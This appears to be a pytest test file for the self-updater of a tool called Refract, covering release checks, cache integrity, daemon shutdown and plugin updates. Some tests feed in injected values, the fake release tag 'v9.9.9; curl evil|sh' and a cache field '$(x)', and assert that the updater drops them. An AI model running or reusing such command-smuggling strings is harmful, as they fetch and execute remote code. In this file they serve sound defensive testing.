def test_remote_strings_never_reach_latest_fields(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    use_dist(monkeypatch, {"url": "https://github.com/sitien173/refract", "vcs_info": {}})
    release(monkeypatch, {"tag_name": "v9.9.9; curl evil|sh", "name": "x", "body": "ignore me"})
    updater.run_check(now=lambda: 1.0, out=lambda _l: None)
    data = read(env)
    assert (data["latest_version"], data["latest_commit"]) == (None, None)
    assert "evil" not in cache_file(env).read_text()


def test_tampered_previous_latest_values_are_dropped(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    env.refract_home.mkdir()
    cache_file(env).write_text(
        json.dumps({"schema": 1, "checked_at": 1.0, "latest_version": "evil", "latest_commit": "$(x)"})
    )
    updater.run_check(now=lambda: 1.0 + updater.CHECK_TTL_S, out=lambda _l: None)
    data = read(env)
    assert (data["latest_version"], data["latest_commit"]) == (None, None)


def test_valid_latest_values_are_written(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    use_dist(monkeypatch, {"url": "https://github.com/sitien173/refract", "vcs_info": {}})
    release(monkeypatch, {"tag_name": "v2.6.0"})
    updater.run_check(now=lambda: 1.0, out=lambda _l: None)
    data = read(env)
    assert data["latest_version"] == "2.6.0"
    assert data["update_available"] is True


@pytest.mark.parametrize(
    "content",
    ["{broken", "[]", '"text"', "null", json.dumps({"schema": 2, "checked_at": 1e12}),
     json.dumps({"schema": 1}), json.dumps({"schema": 1, "checked_at": "now"}),
     json.dumps({"schema": 1, "checked_at": True})],
)
def test_bad_cache_is_treated_as_absent_and_rewritten(env: Env, content: str, monkeypatch: pytest.MonkeyPatch) -> None:
    env.refract_home.mkdir()
    cache_file(env).write_text(content)
    monkeypatch.setattr(updater, "discover", lambda: [Install("codex", "unknown", "manual", "m")])
    updater.run_check(now=lambda: 1e12 + 5, out=lambda _l: None)
    assert read(env)["schema"] == 1
    assert read(env)["components"][0]["name"] == "codex"


def test_symlinked_cache_is_replaced_not_followed(env: Env, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    env.refract_home.mkdir()
    target = tmp_path / "target.json"
    fresh = json.dumps({"schema": 1, "checked_at": 100.0, "components": []})
    target.write_text(fresh)
    cache_file(env).symlink_to(target)
    monkeypatch.setattr(updater, "discover", lambda: [Install("codex", "unknown", "manual", "m")])
    updater.run_check(now=lambda: 101.0, out=lambda _l: None)
    assert not cache_file(env).is_symlink()
    assert target.read_text() == fresh
    assert read(env)["components"][0]["name"] == "codex"


def test_cache_write_is_atomic(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    env.refract_home.mkdir()
    path = cache_file(env)
    path.write_text("OLD")
    replaced: list[tuple[str, str]] = []
    real_replace = os.replace

    def spy(src: str, dst: str) -> None:
        assert Path(src).read_text().startswith("{")
        replaced.append((src, dst))
        real_replace(src, dst)

    monkeypatch.setattr(updater.os, "replace", spy)
    updater.write_cache(path, {"schema": 1, "checked_at": 1.0})
    assert Path(replaced[0][0]).parent == path.parent
    assert Path(replaced[0][1]) == path
    assert sorted(p.name for p in path.parent.iterdir()) == ["update-check.json"]


def test_cache_write_failure_keeps_old_file_and_leaves_no_temp(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    env.refract_home.mkdir()
    path = cache_file(env)
    path.write_text("OLD")

    def fail(*_a: Any) -> None:
        raise OSError("disk")

    monkeypatch.setattr(updater.os, "replace", fail)
    with pytest.raises(OSError):
        updater.write_cache(path, {"schema": 1, "checked_at": 1.0})
    assert path.read_text() == "OLD"
    assert [p.name for p in path.parent.iterdir()] == ["update-check.json"]


def test_check_exits_zero_when_components_fail(env: Env, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]) -> None:
    env.stub("claude", "", 1)
    use_dist(monkeypatch, {"url": "https://github.com/sitien173/refract", "vcs_info": {}})
    release(monkeypatch, exc=URLError("offline"))
    with pytest.raises(SystemExit) as exit_info:
        cli.main(["update", "--check"])
    assert exit_info.value.code == 0
    assert capsys.readouterr().out.splitlines() == [
        "server: failed (cannot check)",
        "claude: failed (cannot list plugins: exit 1)",
    ]


def test_update_without_check_dispatches_to_apply(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(updater, "run_update", lambda: 7)
    with pytest.raises(SystemExit) as exit_info:
        cli.main(["update"])
    assert exit_info.value.code == 7


def spy_popen(monkeypatch: pytest.MonkeyPatch) -> list[tuple[Any, dict[str, Any]]]:
    """Record updater Popen launches, the path Windows `.cmd` shims take; Popen has no timeout argument."""
    popens: list[tuple[Any, dict[str, Any]]] = []
    real = subprocess.Popen

    def spy(args: Any, **kwargs: Any):
        popens.append((args, kwargs))
        return real(args, **kwargs)

    monkeypatch.setattr(updater.subprocess, "Popen", spy)
    return popens


def check_popens(popens: list[tuple[Any, dict[str, Any]]]) -> None:
    for args, kwargs in popens:
        assert isinstance(args, list)
        assert all(isinstance(a, str) for a in args)
        assert not kwargs.get("shell")
        assert kwargs.get("stdin") is subprocess.DEVNULL


def test_every_subprocess_uses_argument_list_and_timeout(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    clone_server(monkeypatch, repos)
    env.stub("claude", json.dumps(PLUGIN))
    env.stub("codex", "[]")
    env.stub("uv", "/nowhere")
    calls: list[tuple[Any, dict[str, Any]]] = []
    real = subprocess.run

    def spy(args: Any, **kwargs: Any):
        calls.append((args, kwargs))
        return real(args, **kwargs)

    monkeypatch.setattr(updater.subprocess, "run", spy)
    popens = spy_popen(monkeypatch)
    updater.run_check(now=lambda: 1.0, out=lambda _l: None)
    assert calls
    check_popens(popens)
    for args, kwargs in calls:
        assert isinstance(args, list)
        assert all(isinstance(a, str) for a in args)
        assert kwargs.get("timeout")
        assert not kwargs.get("shell")
    assert any(a[:2] == ["git", "-C"] and "fetch" in a for a, _ in calls)
    assert not any("pull" in a for a, _ in calls)


def test_end_to_end_claude_and_pi_share_one_clone(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    clone_server(monkeypatch, repos)
    make_package(repos.clone / "plugin")
    (repos.clone / ".git" / "info" / "exclude").write_text("plugin/\n")
    claude_stub(env, PLUGIN, [{"name": "refract", "source": "directory", "path": str(repos.clone)}])
    pi_settings(env, [str(repos.clone / "plugin"), "-bad"])
    env.stub("codex", json.dumps([{"name": "refract"}]))
    sha = repos.upstream_commit("b")
    fetches: list[Any] = []
    real = updater._git

    def spy(root: Path, *args: str, **kwargs: Any):
        if args[:1] == ("fetch",):
            fetches.append(root)
        return real(root, *args, **kwargs)

    monkeypatch.setattr(updater, "_git", spy)
    updater.run_check(now=lambda: 1.0, out=lambda _l: None)
    data = read(env)
    assert [(c["name"], c["state"]) for c in data["components"]] == [
        ("server", "update"), ("claude", "update"), ("pi", "update"), ("pi", "skipped"), ("codex", "manual"),
    ]
    assert data["components"][3]["detail"] == "untrusted source"
    assert fetches == [repos.clone.resolve()]
    assert data["latest_commit"] == sha[:12]
    assert data["update_available"] is True


# --- phase 3 task 1: phase 2 debt ---------------------------------------


@pytest.mark.parametrize("tag", ["v١.٢.٣", "9.9.٣"])
def test_release_tag_with_non_ascii_digits_is_failed(monkeypatch: pytest.MonkeyPatch, tag: str) -> None:
    release(monkeypatch, {"tag_name": tag})
    assert updater.check_release("2.5.0").state == "failed"


def test_installed_version_with_non_ascii_digits_is_failed(monkeypatch: pytest.MonkeyPatch) -> None:
    release(monkeypatch, {"tag_name": "v9.9.9"})
    assert updater.check_release("٢.5.0").state == "failed"


def test_open_release_uses_same_host_redirect_handler(monkeypatch: pytest.MonkeyPatch) -> None:
    handlers: list[Any] = []

    class Opener:
        def open(self, request: Request, timeout: float) -> str:
            return "response"

    def fake_build(*given: Any) -> Opener:
        handlers.extend(given)
        return Opener()

    monkeypatch.setattr(updater, "build_opener", fake_build)
    assert REAL_OPEN_RELEASE(Request(updater.RELEASE_URL), 1.0) == "response"
    assert len(handlers) == 1
    assert isinstance(handlers[0], updater._SameHostRedirect)


def test_check_exits_quietly_when_check_lock_is_held(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    clone_server(monkeypatch, repos)
    env.refract_home.mkdir()
    with updater._file_lock(env.refract_home / "update-check.lock") as held:
        assert held
        lines: list[str] = []
        assert updater.run_check(out=lines.append) == 0
    assert lines == []
    assert not cache_file(env).exists()


def test_concurrent_checks_cannot_both_pass_the_throttle(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    started, proceed = threading.Event(), threading.Event()
    classified: list[int] = []

    def slow(_installs: list[Install]) -> updater.CheckResult:
        classified.append(1)
        started.set()
        proceed.wait(5)
        return updater.CheckResult((), None, None)

    monkeypatch.setattr(updater, "discover", list)
    monkeypatch.setattr(updater, "classify", slow)
    first = threading.Thread(target=updater.run_check, kwargs={"out": lambda _l: None})
    first.start()
    assert started.wait(5)
    lines: list[str] = []
    assert updater.run_check(out=lines.append) == 0
    proceed.set()
    first.join(5)
    assert lines == []
    assert classified == [1]


def test_check_is_not_blocked_by_update_lock(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    clone_server(monkeypatch, repos)
    env.refract_home.mkdir()
    with updater._file_lock(env.refract_home / "update.lock") as held:
        assert held
        assert updater.run_check(out=lambda _l: None) == 0
    assert cache_file(env).exists()


def test_parse_source_percent_decodes_file_url(tmp_path: Path) -> None:
    target = tmp_path / "my dir" / "repo"
    assert updater._parse_source(target.as_uri(), None) == ("clone", target)


def test_server_editable_file_url_with_space(env: Env, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = tmp_path / "my dir" / "repo"
    (repo / "server").mkdir(parents=True)
    subprocess.run(["git", "init", "-q", "-b", "main", str(repo)], check=True)
    use_dist(monkeypatch, {"url": (repo / 'server').as_uri(), "dir_info": {"editable": True}})
    server = updater.discover_server()
    assert (server.source, server.state, server.path) == ("clone", None, repo.resolve())


@pytest.mark.parametrize("dir_info", ["editable", ["editable"], 5])
def test_malformed_dir_info_never_raises(env: Env, monkeypatch: pytest.MonkeyPatch, dir_info: Any) -> None:
    use_dist(monkeypatch, {"url": "file:///somewhere", "dir_info": dir_info})
    server = updater.discover_server()
    assert (server.state, server.detail) == ("manual", "unknown install source")
    with pytest.raises(SystemExit) as exit_info:
        cli.main(["update", "--check"])
    assert exit_info.value.code == 0


def test_run_closes_stdin_and_disables_ssh_prompts(monkeypatch: pytest.MonkeyPatch) -> None:
    seen: list[dict[str, Any]] = []
    monkeypatch.setattr(updater.subprocess, "run", lambda args, **kwargs: seen.append(kwargs))
    monkeypatch.delenv("GIT_SSH_COMMAND", raising=False)
    updater._run(["git", "x"], 1.0)
    assert seen[0]["stdin"] is subprocess.DEVNULL
    assert seen[0]["env"]["GIT_SSH_COMMAND"] == "ssh -o BatchMode=yes"
    assert seen[0]["env"]["GIT_TERMINAL_PROMPT"] == "0"


def test_run_keeps_existing_ssh_command(monkeypatch: pytest.MonkeyPatch) -> None:
    seen: list[dict[str, Any]] = []
    monkeypatch.setattr(updater.subprocess, "run", lambda args, **kwargs: seen.append(kwargs))
    monkeypatch.setenv("GIT_SSH_COMMAND", "ssh -i /k")
    updater._run(["git", "x"], 1.0)
    assert seen[0]["env"]["GIT_SSH_COMMAND"] == "ssh -i /k"


def test_latest_commit_prefers_server_clone(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    commits = {tmp_path / "a": "aaaaaaa", tmp_path / "z": "fffffff"}
    monkeypatch.setattr(updater, "classify_clone", lambda root: updater._CloneResult("update", "behind upstream", commits[root]))
    installs = [
        Install("pi", "clone", None, "", path=tmp_path / "a"),
        Install("server", "clone", None, "", path=tmp_path / "z"),
    ]
    assert updater.classify(installs).latest_commit == "fffffff"


def test_latest_commit_without_server_clone_uses_sorted_first(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    commits = {tmp_path / "a": "aaaaaaa", tmp_path / "z": "fffffff"}
    monkeypatch.setattr(updater, "classify_clone", lambda root: updater._CloneResult("update", "behind upstream", commits[root]))
    installs = [
        Install("claude", "clone", None, "", path=tmp_path / "z"),
        Install("pi", "clone", None, "", path=tmp_path / "a"),
    ]
    assert updater.classify(installs).latest_commit == "aaaaaaa"


# --- phase 3 task 2: lock and latch -------------------------------------

DEFAULT_PORT = 8765
DISCOVERY_ONLY = ["uv tool dir"]
TOKEN = "tok-secret-0123"


@pytest.fixture(autouse=True)
def _never_contact_default_port(monkeypatch: pytest.MonkeyPatch) -> None:
    real = socket.create_connection

    def guard(address: Any, *args: Any, **kwargs: Any):
        if address[1] == DEFAULT_PORT:
            raise AssertionError("contacted the real daemon port")
        return real(address, *args, **kwargs)

    monkeypatch.setattr(socket, "create_connection", guard)


class StubDaemon:
    """In-process daemon on an ephemeral loopback port that mimics the shutdown endpoint."""

    def __init__(self, env: Env, status: int = 200, body: Any = None, stops: bool = False, close_after: float = 0.0) -> None:
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

        self.env = env
        self.requests: list[tuple[str, str]] = []
        self.status, self.body, self.stops, self.close_after = status, body, stops, close_after
        outer = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *_a: Any) -> None:
                return None

            def do_GET(self) -> None:
                self.send_response(404)
                self.end_headers()

            def do_POST(self) -> None:
                outer.requests.append((self.path, self.headers.get("Authorization", "")))
                raw = json.dumps(outer.body if outer.body is not None else {}).encode()
                self.send_response(outer.status)
                self.send_header("Content-Length", str(len(raw)))
                self.end_headers()
                self.wfile.write(raw)
                if outer.stops:
                    threading.Thread(target=outer.stop_later, daemon=True).start()

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    def write_daemon_file(self) -> None:
        self.env.refract_home.mkdir(exist_ok=True)
        (self.env.refract_home / "daemon.json").write_text(
            json.dumps({"token": TOKEN, "host": "127.0.0.1", "port": self.port, "version": "2.5.0"})
        )
        (self.env.refract_home / "daemon.json").chmod(0o600)

    def write_config(self) -> None:
        self.env.refract_home.mkdir(exist_ok=True)
        (self.env.refract_home / "config.toml").write_text(f"[daemon]\nport = {self.port}\n")

    def stop_later(self) -> None:
        (self.env.refract_home / "daemon.json").unlink(missing_ok=True)
        import time

        time.sleep(self.close_after)
        self.close()

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()


@pytest.fixture
def make_daemon(env: Env):
    made: list[StubDaemon] = []

    def make(**kwargs: Any) -> StubDaemon:
        daemon = StubDaemon(env, **kwargs)
        made.append(daemon)
        return daemon

    yield make
    for daemon in made:
        try:
            daemon.close()
        except OSError:
            pass


def free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


@pytest.fixture
def pending(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> str:
    """A server clone that is behind its upstream; returns the upstream commit."""
    clone_server(monkeypatch, repos)
    env.stub("uv", "")
    return repos.upstream_commit("b")


@pytest.fixture
def applied(monkeypatch: pytest.MonkeyPatch) -> list[bool]:
    """Replace the apply step with a spy; the list records each call."""
    calls: list[bool] = []

    def spy(installs: Any, result: Any) -> list[updater.Outcome]:
        calls.append(True)
        return []

    monkeypatch.setattr(updater, "_apply_updates", spy)
    monkeypatch.setattr(updater, "_spawn_serve", lambda: None, raising=False)
    return calls


def run_update(lines: list[str] | None = None) -> int:
    sink = lines if lines is not None else []
    return updater.run_update(out=sink.append)


def test_busy_daemon_refuses_and_changes_nothing(env: Env, repos: Repos, pending: str, make_daemon: Any, applied: list[bool]) -> None:
    daemon = make_daemon(body={"stopping": False, "running": 1, "queued": 2})
    daemon.write_daemon_file()
    head = git(repos.clone, "rev-parse", "HEAD")
    lines: list[str] = []
    assert run_update(lines) == 1
    assert "Refused: 1 running, 2 queued job(s). Nothing was changed." in lines
    assert applied == []
    assert env.call_log() == DISCOVERY_ONLY
    assert git(repos.clone, "rev-parse", "HEAD") == head
    assert not cache_file(env).exists()
    assert daemon.requests == [("/dashboard/api/shutdown", f"Bearer {TOKEN}")]
    assert (env.refract_home / "daemon.json").exists()


def test_busy_refusal_makes_zero_host_calls_with_all_hosts(env: Env, repos: Repos, pending: str, make_daemon: Any, applied: list[bool]) -> None:
    claude_stub(env, PLUGIN, [{"name": "refract", "source": "directory", "path": str(repos.clone)}])
    env.stub("codex", json.dumps([{"name": "refract"}]))
    daemon = make_daemon(body={"stopping": False, "running": 0, "queued": 1})
    daemon.write_daemon_file()
    assert run_update() == 1
    assert env.call_log() == [
        "uv tool dir",
        "claude plugin list --json",
        "claude plugin marketplace list --json",
        "codex plugin list --json",
    ]


def test_idle_daemon_is_latched_and_waited_for(env: Env, pending: str, make_daemon: Any, monkeypatch: pytest.MonkeyPatch, applied: list[bool], restart: dict[str, Any], capsys: pytest.CaptureFixture[str]) -> None:
    daemon = make_daemon(body={"stopping": True, "running": 0, "queued": 0}, stops=True, close_after=0.3)
    daemon.write_daemon_file()
    seen: list[tuple[bool, bool]] = []

    def spy(installs: Any, result: Any) -> list[updater.Outcome]:
        seen.append(((env.refract_home / "daemon.json").exists(), updater._port_open("127.0.0.1", daemon.port)))
        return []

    monkeypatch.setattr(updater, "_apply_updates", spy)
    assert run_update() == 0
    assert seen == [(False, False)]
    assert daemon.requests == [("/dashboard/api/shutdown", f"Bearer {TOKEN}")]
    captured = capsys.readouterr()
    assert TOKEN not in captured.out + captured.err


def test_daemon_not_running_proceeds_without_latch(env: Env, pending: str, applied: list[bool]) -> None:
    env.refract_home.mkdir()
    (env.refract_home / "daemon.json").write_text(
        json.dumps({"token": TOKEN, "host": "127.0.0.1", "port": free_port(), "version": "2.5.0"})
    )
    assert run_update() == 0
    assert applied == [True]


def test_no_daemon_file_and_closed_port_proceeds(env: Env, pending: str, make_daemon: Any, applied: list[bool]) -> None:
    daemon = make_daemon()
    daemon.write_config()
    daemon.close()
    assert run_update() == 0
    assert applied == [True]


def test_old_daemon_404_asks_for_manual_stop(env: Env, pending: str, make_daemon: Any, applied: list[bool]) -> None:
    daemon = make_daemon(status=404, body={"detail": "Not Found"})
    daemon.write_daemon_file()
    lines: list[str] = []
    assert run_update(lines) == 1
    assert applied == []
    assert env.call_log() == DISCOVERY_ONLY
    text = "\n".join(lines)
    assert "Stop the running Refract daemon" in text
    assert "run refract update again" in text


def test_missing_daemon_file_with_live_port_asks_for_manual_stop(env: Env, pending: str, make_daemon: Any, applied: list[bool]) -> None:
    daemon = make_daemon()
    daemon.write_config()
    lines: list[str] = []
    assert run_update(lines) == 1
    assert applied == []
    assert daemon.requests == []
    assert "Stop the running Refract daemon" in "\n".join(lines)


@pytest.mark.parametrize("status", [401, 503, 500])
def test_other_http_errors_fail_before_apply(env: Env, pending: str, make_daemon: Any, applied: list[bool], status: int) -> None:
    daemon = make_daemon(status=status, body={"error": {"code": "x"}})
    daemon.write_daemon_file()
    lines: list[str] = []
    assert run_update(lines) == 1
    assert applied == []
    assert any(line.startswith("Failed:") and "Nothing was changed." in line for line in lines)
    assert TOKEN not in "\n".join(lines)


@pytest.mark.parametrize(
    ("status", "line"),
    [
        (401, "Failed: the daemon rejected the runtime token. Nothing was changed."),
        (503, "Failed: the daemon cannot stop on request. Nothing was changed."),
        (500, "Failed: the daemon answered HTTP 500. Nothing was changed."),
    ],
    ids=["401-rejected-token", "503-cannot-stop", "500-other-status"],
)
def test_shutdown_http_failure_prints_exact_line(env: Env, pending: str, make_daemon: Any, applied: list[bool], status: int, line: str) -> None:
    daemon = make_daemon(status=status, body={"error": {"code": "x"}})
    daemon.write_daemon_file()
    lines: list[str] = []
    assert run_update(lines) == 1
    assert applied == []
    assert lines == [line]


def test_malformed_shutdown_reply_fails_before_apply(env: Env, pending: str, make_daemon: Any, applied: list[bool]) -> None:
    daemon = make_daemon(body={"stopping": "yes"})
    daemon.write_daemon_file()
    assert run_update() == 1
    assert applied == []


def test_latch_timeout_fails_before_apply(env: Env, pending: str, make_daemon: Any, monkeypatch: pytest.MonkeyPatch, applied: list[bool]) -> None:
    monkeypatch.setattr(updater, "LATCH_WAIT_S", 0.3)
    daemon = make_daemon(body={"stopping": True, "running": 0, "queued": 0})
    daemon.write_daemon_file()
    lines: list[str] = []
    assert run_update(lines) == 1
    assert applied == []
    assert any(line.startswith("Failed:") and "did not stop" in line for line in lines)


def test_latch_timeout_prints_exact_did_not_stop_line(env: Env, pending: str, make_daemon: Any, monkeypatch: pytest.MonkeyPatch, applied: list[bool]) -> None:
    monkeypatch.setattr(updater, "LATCH_WAIT_S", 0.3)
    daemon = make_daemon(body={"stopping": True, "running": 0, "queued": 0})
    daemon.write_daemon_file()
    lines: list[str] = []
    assert run_update(lines) == 1
    assert applied == []
    assert lines == ["Failed: the daemon did not stop in time. The daemon may be stopping; run: refract serve No update was applied."]


def test_lock_contention_exits_one(env: Env, pending: str, applied: list[bool]) -> None:
    env.refract_home.mkdir()
    with updater._file_lock(env.refract_home / "update.lock") as held:
        assert held
        lines: list[str] = []
        assert run_update(lines) == 1
    assert lines == ["Another refract update is running."]
    assert applied == []
    assert env.call_log() == []


def test_nothing_to_update_never_touches_daemon(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch, make_daemon: Any) -> None:
    clone_server(monkeypatch, repos)
    daemon = make_daemon(body={"stopping": True, "running": 0, "queued": 0})
    daemon.write_daemon_file()
    lines: list[str] = []
    assert run_update(lines) == 0
    assert daemon.requests == []
    assert env.call_log() == []
    assert lines
    assert "current" in lines[0]


def test_update_lock_is_released_after_run(env: Env, pending: str, make_daemon: Any, applied: list[bool]) -> None:
    daemon = make_daemon()
    daemon.write_config()
    daemon.close()
    assert run_update() == 0
    assert run_update() == 0


def test_configured_endpoint_reads_daemon_section_and_defaults(env: Env) -> None:
    assert updater._configured_endpoint() == ("127.0.0.1", 8765)
    env.refract_home.mkdir()
    (env.refract_home / "config.toml").write_text('[daemon]\nhost = "::1"\nport = 9100\n')
    assert updater._configured_endpoint() == ("::1", 9100)
    (env.refract_home / "config.toml").write_text("not [toml")
    assert updater._configured_endpoint() == ("127.0.0.1", 8765)


# --- phase 3 task 3: apply ----------------------------------------------

MARKETS = "markets.json"


def claude_apply_stub(
    env: Env,
    markets: Any,
    *,
    sha_after_install: str | None = None,
    enabled_after_install: bool = True,
    marketplace_code: int = 0,
    update_code: int = 0,
    install_code: int = 0,
) -> None:
    """Stub claude: install flips the list output and rewrites installed_plugins.json."""
    root = env.root
    (root / "before.json").write_text(json.dumps(PLUGIN))
    (root / "after.json").write_text(json.dumps([{**PLUGIN[0], "enabled": enabled_after_install}]))
    (root / MARKETS).write_text(json.dumps(markets))
    installed = {"version": 2, "plugins": {"refract@refract": [{"scope": "user", "gitCommitSha": sha_after_install}]}}
    (root / "after_installed.json").write_text(json.dumps(installed))
    target = env.claude_dir / "plugins" / "installed_plugins.json"
    flag = root / "reinstalled.flag"
    env.stub(
        "claude",
        body=(
            "import pathlib\n"
            f"flag = pathlib.Path({str(flag)!r})\n"
            f"def show(name):\n    sys.stdout.write(pathlib.Path({str(root)!r}, name).read_text())\n"
            'if joined == "plugin list --json":\n'
            '    show("after.json" if flag.exists() else "before.json")\n'
            'elif joined == "plugin marketplace list --json":\n'
            f"    show({MARKETS!r})\n"
            'elif joined.startswith("plugin marketplace update"):\n'
            f"    sys.exit({marketplace_code})\n"
            'elif joined.startswith("plugin update"):\n'
            f"    sys.exit({update_code})\n"
            'elif joined.startswith("plugin install"):\n'
            f"    if {install_code} == 0:\n"
            "        flag.touch()\n"
            f"        pathlib.Path({str(target)!r}).write_text(pathlib.Path({str(root)!r}, 'after_installed.json').read_text())\n"
            f"    sys.exit({install_code})\n"
        ),
    )


@pytest.fixture
def shared(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> str:
    """Server, Claude Code, and Pi all point at one clone that is behind its upstream."""
    clone_server(monkeypatch, repos)
    make_package(repos.clone / "plugin")
    (repos.clone / ".git" / "info" / "exclude").write_text("plugin/\n")
    pi_settings(env, [str(repos.clone / "plugin")])
    env.stub("uv", "")
    env.stub("pi", "")
    sha = repos.upstream_commit("b")
    seed_installed(env.claude_dir, {"refract@refract": [{"scope": "user", "gitCommitSha": sha}]})
    claude_apply_stub(env, [{"name": "refract", "source": "directory", "path": str(repos.clone)}])
    return sha


def apply_now() -> list[updater.Outcome]:
    installs = updater.discover()
    return updater._apply_updates(installs, updater.classify(installs))


def statuses(outcomes: list[updater.Outcome]) -> list[tuple[str, str]]:
    return [(o.name, o.status) for o in outcomes]


def host_calls(env: Env) -> list[str]:
    return [c for c in env.call_log() if not c.endswith(("list --json", "tool dir"))]


def pull_spy(monkeypatch: pytest.MonkeyPatch) -> list[Path]:
    pulls: list[Path] = []
    real = updater._git

    def spy(root: Path, *args: str, **kwargs: Any):
        if args[:2] == ("pull", "--ff-only"):
            pulls.append(root)
        return real(root, *args, **kwargs)

    monkeypatch.setattr(updater, "_git", spy)
    return pulls


def test_shared_clone_is_pulled_once_and_every_host_updated(env: Env, repos: Repos, shared: str, monkeypatch: pytest.MonkeyPatch) -> None:
    pulls = pull_spy(monkeypatch)
    outcomes = apply_now()
    assert pulls == [repos.clone.resolve()]
    assert statuses(outcomes) == [("server", "updated"), ("claude", "updated"), ("pi", "updated")]
    assert git(repos.clone, "rev-parse", "HEAD") == shared
    assert host_calls(env) == [
        f"uv pip install -p {sys.executable} -e {repos.clone.resolve() / 'server'}",
        "claude plugin marketplace update refract",
        "claude plugin update refract@refract",
    ]


@pytest.mark.parametrize("mutation", ["dirty", "detached", "merge"])
def test_clone_that_became_unsafe_at_recheck_is_skipped(env: Env, repos: Repos, shared: str, monkeypatch: pytest.MonkeyPatch, mutation: str) -> None:
    installs = updater.discover()
    result = updater.classify(installs)
    if mutation == "dirty":
        (repos.clone / "scratch.txt").write_text("x")
    elif mutation == "detached":
        git(repos.clone, "checkout", "-q", "--detach")
    else:
        (repos.clone / ".git" / "MERGE_HEAD").write_text(shared + "\n")
    head = git(repos.clone, "rev-parse", "HEAD")
    pulls = pull_spy(monkeypatch)
    outcomes = updater._apply_updates(installs, result)
    expected = {"dirty": "dirty", "detached": "detached HEAD", "merge": "unfinished operation"}[mutation]
    assert [(o.name, o.status, o.detail) for o in outcomes] == [(n, "skipped", expected) for n in ("server", "claude", "pi")]
    assert pulls == []
    assert host_calls(env) == []
    assert git(repos.clone, "rev-parse", "HEAD") == head


def test_failed_pull_fails_every_dependent_and_runs_no_host_command(env: Env, repos: Repos, shared: str) -> None:
    installs = updater.discover()
    result = updater.classify(installs)
    for entry in repos.bare.rglob("*"):
        entry.chmod(0o700)  # git writes read-only object files; Windows refuses to delete them
    shutil.rmtree(repos.bare)
    outcomes = updater._apply_updates(installs, result)
    assert [(o.name, o.status, o.detail) for o in outcomes] == [(n, "failed", "pull failed") for n in ("server", "claude", "pi")]
    assert host_calls(env) == []


def test_one_host_failing_does_not_stop_the_others(env: Env, shared: str) -> None:
    env.stub("uv", "", 1)
    outcomes = apply_now()
    assert [(o.name, o.status) for o in outcomes] == [("server", "failed"), ("claude", "updated"), ("pi", "updated")]
    assert outcomes[0].detail == "install failed (exit 1)"


def test_claude_marketplace_update_failure_is_reported_and_skips_plugin_update(env: Env, repos: Repos, shared: str) -> None:
    claude_apply_stub(
        env, [{"name": "refract", "source": "directory", "path": str(repos.clone)}], marketplace_code=3
    )
    outcomes = apply_now()
    assert [(o.name, o.status, o.detail) for o in outcomes][1] == ("claude", "failed", "marketplace update failed (exit 3)")
    assert not any(c.startswith("claude plugin update") for c in env.call_log())
    assert outcomes[2].status == "updated"


def test_claude_plugin_update_failure_is_reported(env: Env, repos: Repos, shared: str) -> None:
    claude_apply_stub(env, [{"name": "refract", "source": "directory", "path": str(repos.clone)}], update_code=4)
    outcomes = apply_now()
    assert (outcomes[1].status, outcomes[1].detail) == ("failed", "plugin update failed (exit 4)")


def force_reinstall_setup(env: Env, repos: Repos, sha: str, **stub: Any) -> None:
    seed_installed(env.claude_dir, {"refract@refract": [{"scope": "user", "gitCommitSha": "a" * 40}]})
    claude_apply_stub(env, [{"name": "refract", "source": "directory", "path": str(repos.clone)}], **stub)


def test_claude_forced_reinstall_when_sha_is_unchanged(env: Env, repos: Repos, shared: str) -> None:
    force_reinstall_setup(env, repos, shared, sha_after_install=shared)
    outcomes = apply_now()
    assert (outcomes[1].name, outcomes[1].status) == ("claude", "updated")
    assert [c for c in host_calls(env) if c.startswith("claude")] == [
        "claude plugin marketplace update refract",
        "claude plugin update refract@refract",
        "claude plugin uninstall refract@refract -s user --keep-data",
        "claude plugin install refract@refract -s user",
    ]


def test_claude_enabled_state_lost_is_failed_with_restore_command(env: Env, repos: Repos, shared: str) -> None:
    force_reinstall_setup(env, repos, shared, sha_after_install=shared, enabled_after_install=False)
    outcome = apply_now()[1]
    assert outcome.status == "failed"
    assert "claude plugin enable refract@refract -s user" in outcome.detail


def test_claude_reinstall_failure_names_the_restore_command(env: Env, repos: Repos, shared: str) -> None:
    force_reinstall_setup(env, repos, shared, install_code=1)
    outcome = apply_now()[1]
    assert outcome.status == "failed"
    assert outcome.detail.startswith("reinstall failed (exit 1)")
    assert "claude plugin install refract@refract -s user" in outcome.detail


def test_claude_sha_still_different_after_reinstall_is_failed(env: Env, repos: Repos, shared: str) -> None:
    force_reinstall_setup(env, repos, shared, sha_after_install="b" * 40)
    outcome = apply_now()[1]
    assert (outcome.status, outcome.detail) == ("failed", "plugin cache still differs from the clone")


def test_claude_github_marketplace_runs_update_only(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    use_dist(monkeypatch, None)
    release(monkeypatch, {"tag_name": "v2.6.0"})
    claude_apply_stub(env, [{"name": "refract", "source": "github", "repo": "sitien173/refract"}])
